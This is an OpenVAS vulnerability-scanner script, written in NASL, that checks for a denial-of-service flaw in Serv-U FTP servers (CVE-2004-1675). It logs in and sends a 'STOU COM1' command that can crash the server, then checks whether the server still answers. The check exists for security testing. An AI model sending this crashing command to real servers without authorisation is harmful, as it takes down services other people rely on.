# OpenVAS Vulnerability Test
# $Id: ftp_servu_dos3.nasl 17 2013-10-27 14:01:43Z jan $
# Description: FTP Serv-U 4.x 5.x DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It is possible to crash the remote FTP server by sending it a STOU command. 

This vulnerability allows an attacker to prevent you from sharing data through FTP, 
and may even crash this host.";

tag_solution = "Upgrade to latest version of this software";

#  Ref: Patrick <patrickthomassen gmail com>

if(description)
{
 script_id(14709);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2004-1675");
 script_bugtraq_id(11155);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
  
 name = "FTP Serv-U 4.x 5.x DoS";
  
 script_name(name);
	     
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);  
 
 script_summary("Crashes Serv-U");
 script_category(ACT_DENIAL);
 script_family("Denial of Service");
  
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
		  
 script_dependencies("find_service.nasl");
  script_require_ports("Services/ftp", 21);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
   s = string("STOU COM1", "\r\n");
   send(socket:soc, data:s);
   close(soc);
   
   soc2 = open_sock_tcp(port);
   if ( ! soc2 || ! recv_line(socket:soc2, length:4096 ) ) security_warning(port);
   else close(soc2);
   close(soc);
  }
 }
}
exit(0);
